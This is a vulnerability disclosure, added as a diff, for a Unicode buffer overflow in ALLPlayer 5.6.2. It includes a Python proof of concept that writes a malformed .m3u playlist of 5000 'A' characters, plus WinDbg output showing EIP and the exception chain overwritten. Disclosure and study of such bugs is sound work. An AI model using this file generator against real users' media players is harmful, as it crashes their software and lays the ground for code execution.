@@ -1,0 +1,49 @@
+Title: ALLPlayer Local Buffer Overflow PoC UNICODE 
+Vendor: http://www.allplayer.org/download/allplayer
+Date found:     09.10.2013
+Date published: 09.10.2013
+Platform: windows 7 German
+Bug: Buffer Overflow UNICODE
+----------------------------
+ 
+1)VERSIONS AFFECTED
+----
+ALLPlayer 5.6.2
+
+2)Proof of Concept
+------------------
+ 
+junk = "http://"
+
+buffer="\x41" * 5000
+
+exploit = junk + buffer 
+
+try:
+    out_file = open("ALLPlayer_Poc.m3u",'w')
+    out_file.write(exploit)
+    out_file.close()
+    print "Exploit file created!" 
+except:
+    print "Error"
+
+3)-(DEBUG)
+----------
+(1e60.1dec): Access violation - code c0000005 (!!! second chance !!!)
+*** WARNING: Unable to verify checksum for C:\Program Files\ALLPlayer\ALLPlayer.exe
+*** ERROR: Module load completed but symbols could not be loaded for C:\Program Files\ALLPlayer\ALLPlayer.exe
+eax=00000000 ebx=00000000 ecx=00410041 edx=770d720d esi=00000000 edi=00000000
+eip=00410041 esp=000311c4 ebp=000311e4 iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00210246
+ALLPlayer+0x10041:
+00410041 008bc0ff2504    add     byte ptr [ebx+425FFC0h],cl ds:0023:0425ffc0=??
+0:000> !exchain
+---------------
+0012e4b0: ALLPlayer+1b7037 (005b7037)
+0012e734: ALLPlayer+10041 (00410041)
+Invalid exception stack at 00410041
+
+4)Credits
+---------
+metacom
+Contact : metacom27 at gmail.com
